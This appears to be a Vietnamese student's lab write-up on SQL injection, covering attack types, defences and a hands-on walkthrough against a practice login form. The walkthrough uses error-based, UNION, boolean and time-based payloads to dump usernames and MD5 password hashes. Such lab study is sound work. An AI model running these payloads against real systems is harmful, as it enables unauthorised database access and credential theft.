# Task 7

# tìm hiểu về SQLi
## 1. SQLi
là cuộc tấn công mà attacker can thiệp vào cơ sở dữ liệu thông qua các câu truy vấn để truy xuất, sửa đổi, xóa hoặc gây ảnh hướng đến database hay nội dung thao tác của người dùng.
## 2. Hậu quả của SQLi
SQLi đơn giản có thể giúp người tấn công thêm, sửa xóa dữ liệu trong database
Một cuộc tấn công SQLi thành công có thể dẫn đến RCE khiến những dữ liệu nhạy cảm bị truy cập trái pháp. Tài khoản ngân hàng, tài khoản mạng xã hội, số điện thoại, thông tin cá nhân,... Nhiều vụ vi phạm dữ liệu nghiêm trọng gần đây là kết quả của các cuộc tấn công SQLi. Không chỉ vậy nó còn làm ảnh hưởng đến uy tín của đơn vị chủ quản. Trong một số trường hợp kẻ tấn công có thể chiếm dược 1 backdoor vào hệ thống của tổ chức dẫn đến sự xâm phạm kéo dài không được chú ý gây khó khăn cho việc điều tra.
## 3. SQLi hoạt động
* đầu tiên attacker sẽ tìm các điểm yếu trên web như input, parameter,...
* sau đó attacker sử dụng các câu lệnh SQL cùng với các ký tự khác để xác định cách truy cập vào database
* cuối dùng dùng các câu lệnh SQL để tấn công
## 4. Các loại SQL 
![](https://i.imgur.com/sFIM3rU.png)

có 3 loại chính là
* in-band SQLi: được chia làm 2 nhánh nhỏ
    * error based SQLi: Dựa vào lỗi trong câu lệnh SQL để xác định cấu trúc database từ đó tìm ra cách truy cập vào database
    * Union based SQLi: Sử dụng câulệnh UNION trong các truy vấn SQL để truy cập vào database
* Blind(inferential) SQLi: các phản hồi nhận được không chứa kết quả của truy vấn. Blind lại được chia làm 2 loại:
    * Boolean: câu truy vấn trả về đúng hoặc sai từ đó attacker điều chỉnh câu truy vấn
    * time-based: attacker sẽ sử dụng câu truy vấn làm database trả về kết quả trong 1 thời ịnh tùy thuộc vào thuộc tính đúng sai, từ đó điều chỉnh câu truy vấn để khai thác.
* out-of-band SQLi: là một loại SQLi mà kẻ tấn công không nhận được phản hồi từ ứng dụng bị tấn công trên cùng một kênh. mà thay vào đó có thể kiến ứng dụng gửi dữ liệu đến một điểm từ xa mà họ quản lý. Kiểu tấn công này chỉ có thể xảy ra khi mà bạn sử dụngcác lệnh kích hoạt các yêu cầu DNS hoặc HTTP. Tuy nhiên, đó là trường hợp của tất cả các máy chủ SQL phổ biến.
## 5. Cách phòng chống SQLi
* Lọc dữ liệu từ người dùng: Cách phòng chống này tương tự như XSS. Ta sử dụng filter để lọc các kí tự đặc biệt (; ” ‘) hoặc các từ khoá (SELECT, UNION) do người dùng nhập vào. Nên sử dụng thư viện/function được cung cấp bởi framework. Viết lại từ đầu vừa tốn thời gian vừa dễ sơ sót.
* Không cộng chuỗi để tạo SQL: Sử dụng parameter thay vì cộng chuỗi. Nếu dữ liệu truyền vào không hợp pháp, SQL Engine sẽ tự động báo lỗi, ta không cần dùng code để check.
* Không hiển thị exception, message lỗi: Hacker dựa vào message lỗi để tìm ra cấu trúc database. Khi có lỗi, ta chỉ hiện thông báo lỗi chứ đừng hiển thị đầy đủ thông tin về lỗi, tránh hacker lợi dụng.
* Phân quyền rõ ràng trong DB: Nếu chỉ truy cập dữ liệu từ một số bảng, hãy tạo một account trong DB, gán quyền truy cập cho account đó chứ đừng dùng account root hay sa. Lúc này, dù hacker có inject được sql cũng không thể đọc dữ liệu từ các bảng chính, sửa hay xoá dữ liệu.
* Backup dữ liệu thường xuyên: Các cụ có câu “cẩn tắc vô áy náy”. Dữ liệu phải thường xuyên được backup để nếu có bị hacker xoá thì ta vẫn có thể khôi phục được.

* môt phương pháp khác vô cùng hữu dụng và được sử dụng phổ biến ngày nay chính là bind-param. Việc này vừa giúp giảm thiểu thời gian phân tích cú pháp vừa giảm thiểu băng thông đến máy chủ và hơn hết là chống SQLi rất hữu hiệu.  
## 6. cách khai thác SQL 
### cách phát hiện
* Gửi dấu nháy đơn ' , nháy kép ", chấm phẩy ;, ký tự comment như --, #,... và chờ kết quả phản hồi của web.
* Gửi các điều kiện boolean như OR 1=1, OR 1=2 ... và xem phản hồi.
* Gửi payload thử thời gian trả về như SLEEP(5), pg_sleep(10), DELAY '0:0:10' ...

### Khai thác:
#### error-based:
Thực hiện chèn các câu truy vấn độc hại với mục tiêu thông qua input, sau đó dựa vào thông báo lỗi để thu thập thông tin về cấu trúc của database như tên database, tên bảng số cột tên cột và thậm chí là thông tin trong bảng.


#### Union-based:
Trả về kết quả của các câu lệnh SELECT từ bảng khác với điều kiện trả về cùng số cột và kiểu dữ liệu của cột.

Xác định số cột cần để tấn công: Sử dụng ORDER BY để thu thập thông tin về database ví dụ ' ORDER BY x-- với x là số cột cần thử và từ phản hồi tìm được số cột.

có 2 cách thường được sử dụng để tìm số cột của bảng.
 sử dụng `UNION SELECT`:

```
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
 sử dụng `ORDER BY`
```
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
```

truy suất db tên bảng, tên cột:
```
#Database names
-1' UNION SELECT 1,2,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata

#Tables of a database
-1' UNION SELECT 1,2,3,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=[database]

#Column names
-1' UNION SELECT 1,2,3,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=[table name]
```

#### blind SQLi:
không thể nhìn thấy kết quả truy vấn lỗi nhưng có thể phân biệt được phản hồi đúng hay sai dựa vào nội dung trả về trên trang. Khi đó có thể truy xuất tường ký tự của dữ liệu trong db: 
```
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
##### ERROR blind SQLi:
Đây là trường hợp tương tự như trước nhưng thay vì phân biệt giữa phản hồi đúng/sai từ truy vấn thì có thể phân biệt giữa lỗi trong truy vấn SQL hay không (có thể do lỗi HTTP server). Do đó, trong trường hợp này có thể buộc một SQLerror mỗi khi bạn đoán đúng ký tự:

`AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- - `

Time-base SQLi:
Đây là trường hợp không phân biệt được truy vấn dựa vào ngữ cảnh của trang web. Tuy nhiên có thể biết được kết quả truy vấn đúng hay sai bằng cách xác định thời gian trả về từ database:
`1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#`

## Thực hành nàoooo
### Error based:
tại màn hình đăng nhập. em đã nhập payload: `''` thử để kiểm tra và nhập một mật khẩu bất kì vì web yêu cầu phải điền mật khẩu. sau đó em thấy web hiện error lên là tín hiệu để có thể khai thác.
![](https://i.imgur.com/7m2UG1c.png)
đầu tiên là tìm tên bảng, em sẽ sử dụng payload: `' or 1=1 group by concat(database(),'-', floor(rand(0)*2)) having min(0)-- `

ở đây tận dụng lỗi Duplicate entry for key 'group_key' key trùng nhay ở đây sẽ là 
![](https://i.imgur.com/PnyABCb.png)
vậy là từ việc web báo lỗi, chúng ta đã biết được tên database là 'task7'
tiếp theo là tên bảng, em sử dụng payload tương tự bên trên. `' or 1=1 group by concat((select table_name from information_schema.tables where table_schema='task7'),'-',floor(rand(0)*2)) having min(0)-- `
![](https://i.imgur.com/PEUUVCa.png)
vậy là thu được table name là 'user' 
 tiếp theo chúng ta sẽ tìm từng cột của bảng user đó. Em sử dụng payload:
`' or 1=1 group by concat((select column_name from information_schema.columns where table_name='user' and table_schema='task7' limit 0,1),'-',floor(rand(0)*2)) having min(0)-- `

limit sẽ cho em lấy được tên của từng cột một. tăng dần giá trị của limit lên em sẽ thu được những cột khác nhau.

![](https://i.imgur.com/D5w8V4S.png)
![](https://i.imgur.com/9UGL3BP.png)
![](https://i.imgur.com/8ACWe5Q.png)
với limit 3,1 web trả về NULL tức là bảng chỉ có 3 cột lần lượt là id, username, pasword

bây giờ ta sẽ khai thác thẳng vào thông tin của những người dùng.
đầu tiên em sẽ tìm username và password của người đầu tiên bằng payload: 
`' or 1=1 group by concat((select user from user limit 0,1),'-',floor(rand(0)*2)) having min(0)-- `
![](https://i.imgur.com/ahHawYp.png)
`' or 1=1 group by concat((select password from user limit 0,1),'-',floor(rand(0)*2)) having min(0)-- `
![](https://i.imgur.com/EraR9Xp.png)
vậy ta thu được : 
username: admin
password: 0cc175b9c0f1b6a831c399e269772661
đem password đi md5decode ta được pass ban đầu là a

để khai thác các đối tượng khác trong bảng thì ta chỉ cần tiếp tục làm tương tự. thay đổi giá trị k tại limit k,1.

### UNION
... 
nhập payload vào username như error-based
đầu tiên em thử payload: `1' ORDER BY 1-- ` 
![](https://i.imgur.com/DUPeQT4.png)
web trả về null. 
tương tự với 
`1' ORDER BY 2-- `
`1' ORDER BY 3-- `
nhưng đến `1' ORDER BY 4-- ` thì web báo lỗi.
![](https://i.imgur.com/KZ4Ytp1.png)
 Vậy là chúng ta biết được rằng bảng có 3 cột.
 sau đó em sẽ kiểm tra xem dữ liệu có thể truy xuất được từ cột nào trong 3 cột bằng payload:
 `' UNION SELECT 'a','b','c' -- `
 ![](https://i.imgur.com/w7NTsQV.png)
vậy là cả 3 cột đều có thể truy suất được dữ liệu. 
tiếp theo em sẽ tìm tên database bằng payload: 
`' UNION SELECT database(),null,null -- `
![](https://i.imgur.com/C7YA1qL.png)
từ vị trí đầu ta thu được tên database là task7, tiếp theo là tìm tên bảng trong database bằng payload: 
`' UNION SELECT GROUP_CONCAT(table_name),null,null FROM information_schema.tables WHERE table_schema='task7'-- `
![](https://i.imgur.com/6AIZQrr.png)
thu được tên bảng là user
tiếp tục tìm các cột trong database task7 bảng user với payload: `' UNION SELECT GROUP_CONCAT(column_name),null,null FROM information_schema.columns WHERE table_name='user' and table_schema='task7'-- `
![](https://i.imgur.com/eSA6Tse.png)
thu được tên 3 cột lần lượt là id,username,password. việc cuối cùng là truy xuất tất cả thông tin trong bảng thôi. payload: 
`' UNION SELECT GROUP_CONCAT(CONCAT(id,'~',username,'~',password)),null,null FROM user -- `
![](https://i.imgur.com/wqyG2NE.png)
kết quả thu hoạch:
user:admin
pwd:0cc175b9c0f1b6a831c399e269772661
user:test1
pwd:5a105e8b9d40e1329780d62ea2265d8a
user:123
pwd:202cb962ac59075b964b07152d234b70
yeahhh!

### boolean:
bước đầu tiên kiểm tra độ dài của database, dùng payload:
`' or 1=1 and length(database())= 1 -- `
nếu đúng độ dài của database thì chúng ta sẽ đăng nhập vào được.
![](https://i.imgur.com/Pjs5oaL.png)
chưa thông báo đăng nhập thành công vậy chúng ta chạy burp tìm độ dài đúng. chạy burpsuite với từ khóa là `dang nhap thanh cong` tìm được độ dài của database là 5
giờ sử dụng burpsuite, burteforce tìm tên của database() payload: kí tự thứ b là a nếu đúng thì sẽ đăng nhập vào được
`' or 1=1 and substring(database(),b,1)='a' -- `
![](https://i.imgur.com/v1MPMIC.png)
vậy tên database là task7
rồi đi tìm độ dài và tên bảng với payload: i là số kí tự của bảng
`1' or (SELECT length(table_name) FROM information_schema.tables WHERE table_schema = 'task7')=i  -- -`
![](https://i.imgur.com/mKs5EE8.png)
vậy trong task7 có một bảng duy nhất với độ dài 4 kí tự. 
dùng substring để tìm tên của bảng đó. với kí tự j ở vị trí thứ i
`' or substring((SELECT table_name FROM information_schema.tables WHERE table_schema = 'task7'),i,1)='j'; -- -`
 ![](https://i.imgur.com/ghlbtvq.png)
được tên bảng là user
bắt đầu tìm tên cột
`1' or (SELECT length(column_name) FROM information_schema.columns WHERE table_name = 'user')=i  -- -`
![](https://i.imgur.com/wUcORWf.png)
lỗi này do có nhiều hơn 1 cột, vậy chúng ta sẽ tìm từng cột một xem có bao nhiêu cột.
`1' or (SELECT length(column_name) FROM information_schema.columns WHERE table_name = 'user' and TABLE_schema='task7' limit 0,1)=i  -- -`
![](https://i.imgur.com/ueJTi7S.png)
vậy là có 3 bảng với độ dài lần lượt là 2-8-8
`' or (case when substr((SELECT column_name FROM information_schema.columns WHERE table_name='user' and table_schema = 'task7' limit 0,1),1,1)='a' then 1 else 0 end) =1 -- `
bảng 1 là limit 0,1
bảng 2 là limit 1,1
bảng 3 là limit 2,1
![](https://i.imgur.com/woLa6aM.png)
vậy là tìm được 3 bảng là: id, username, password
cuối cùng là khai thác dữ liệu trong bảng thôi.
`' OR (case when substr((select username from user limit 0,1),1,1)='0' then 1 else 0 end)=1 -- `
![](https://i.imgur.com/wrf6c4o.png)
vậy là ta thu được 3 user là: admin, test1, 123 
giờ tìm kiếm mật khẩu của mỗi tài khoản thôi:
`' OR (case when substr((select password from user where username='admin'),1,1)='0' then 1 else 0 end)=1 -- `
![](https://i.imgur.com/ws2R6pR.png)
![](https://i.imgur.com/uq0E8ra.png)
![](https://i.imgur.com/ntoXMl2.png)

và đó là cách chúng ta sử dụng burpsuite và boolean để thực hiện truy xuất dữ liệu một database bị rò rỉ.

### time_base
cũng giống như bool lean nhưng lần này chúng ta sẽ cho mọi giá trị nếu sai thì sẽ trả về 1=1 còn đúng thì chúng ta cho delay thời gian trả về. từ đó chúng ta có thể nhận thấy sự khác nhau giữa các giá trị khác nhau. 
đầu tiên bắt đầu với việc chạy thử payload:`a' or sleep(2); -- `
![](https://i.imgur.com/9izkM8U.png)
sau đó rất lâu web mới trả về, đó là dấu hiệu nhận biết được rằng có thể thực hiện time_base.
bước 1 vẫn là xác định tên của database:
`' or (case when substring((select database() limit 0,1),§1§,1)='§a§' then sleep(1) else 1 end)=1 -- `

![](https://i.imgur.com/3VWku5t.png)
 vậy là ta được tên database là task7
 
 tiếp theo là tìm tên bảng.
 `' or substring((SELECT table_name FROM information_schema.tables WHERE table_schema = 'task7' limit 0,1),§1§,1)='§a§' then sleep(1) else 1 end)=1 -- `
 ![](https://i.imgur.com/vbgO0p9.png)
vậy là ta ra một bảng duy nhất là user
tiếp theo là đi tìm tên các cột trong bảng. 
`' or (case when substr((SELECT column_name FROM information_schema.columns WHERE table_name='user' and table_schema = 'task7' limit §0§,1),§1§,1)='§a§' then sleep(1) else 1 end)=1 -- `
![](https://i.imgur.com/T2yAk8L.png)
tìm được 3 cột tên lần lượt là id, username, password.
tiếp theo ta sẽ đi tìm trong tên user trong bảng. 
`' OR (case when substr((select username from user limit §0§,1),§1§,1)='§a§' then sleep(1) else 1 end)=1 -- `
![](https://i.imgur.com/b6ozlCw.png)
tìm được 3 username là admin, test1, 123
ta sẽ đi tìm mật khẩu ứng với user:'admin'
`' OR (case when substr((select password from user where username='admin'),§1§,1)='§a§' then sleep(1) else 1 end)=1 -- `

![](https://i.imgur.com/GkALkit.png)
vậy là chúng ta đã lấy được password của admin. 
các user khác làm tương tự admin.


